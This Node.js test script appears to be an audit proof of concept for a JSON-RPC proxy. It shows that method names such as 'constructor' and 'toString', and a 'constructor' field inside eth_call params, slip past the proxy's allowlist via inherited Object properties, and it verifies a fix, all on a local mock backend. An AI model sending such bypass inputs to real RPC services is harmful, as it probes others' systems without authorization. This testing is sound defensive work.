import http from 'node:http';
import fs from 'node:fs';
import assert from 'node:assert/strict';
const fixed = process.argv.includes('--fixed');
const {createPublicRpc} = await import(fixed ? './frozen/fixed-public-rpc.mjs' : './frozen/public-rpc.mjs');
const seen=[];
const backend=http.createServer(async(req,res)=>{
 let s='';for await(const c of req)s+=c;
 const q=JSON.parse(s);seen.push({method:q.method,params:q.params});
 const result=q.method==='eth_chainId'?'0x2105':q.method==='eth_syncing'?false:q.method==='eth_getBlockByNumber'?{number:'0x1',timestamp:'0x'+Math.floor(Date.now()/1000).toString(16)}:'BACKEND_FORWARDED';
 res.setHeader('content-type','application/json');res.end(JSON.stringify({jsonrpc:'2.0',id:q.id,result}));
});
let role;
try{
 await new Promise(r=>backend.listen(0,'127.0.0.1',r));
 const reserve=http.createServer();await new Promise(r=>reserve.listen(0,'127.0.0.1',r));const port=reserve.address().port;await new Promise(r=>reserve.close(r));
 role=await createPublicRpc({port,bind:'127.0.0.1',hostId:'0x'+'11'.repeat(32),chainId:8453,node:'http://127.0.0.1:'+backend.address().port,allowedOrigins:['http://localhost']});
 const results=[];
 for(const [method,params] of [['unlisted_xyz',[]],['constructor',[]],['toString',[]],['eth_call',[JSON.parse('{"to":"0x1111111111111111111111111111111111111111","constructor":"unexpected"}'),'latest']]]){
  const at=seen.length;const r=await fetch('http://127.0.0.1:'+port+'/',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method,params}),signal:AbortSignal.timeout(5000)});
  results.push({method,status:r.status,response:await r.json(),forwarded:seen.slice(at).filter(q=>q.method===method)});
 }
 assert.equal(results[0].response.error.code,-32601);assert.equal(results[0].forwarded.length,0);
 if(fixed){for(const i of [1,2]){assert.equal(results[i].response.error.code,-32601);assert.equal(results[i].forwarded.length,0)}assert.equal(results[3].response.error.code,-32602);assert.equal(results[3].forwarded.length,0)}else{assert.equal(results[1].forwarded.length,1);assert.equal(results[2].forwarded.length,1);assert.equal(results[3].forwarded[0].params[0].constructor,'unexpected')}
 const result={observedAt:new Date().toISOString(),scope:'Actual candidate HTTP role; scripted loopback backend, not Reth or production. Proves strict method/field allowlist bypass through inherited Object properties, not arbitrary RPC/admin execution.',counterexample:!fixed,correctionVerified:fixed,results};
 fs.writeFileSync(new URL(fixed ? './FIXED-RESULT.json' : './RESULT.json',import.meta.url),JSON.stringify(result,null,2)+'\n');console.log(JSON.stringify(result));
}finally{await role?.close();backend.closeAllConnections();await new Promise(r=>backend.close(r));}
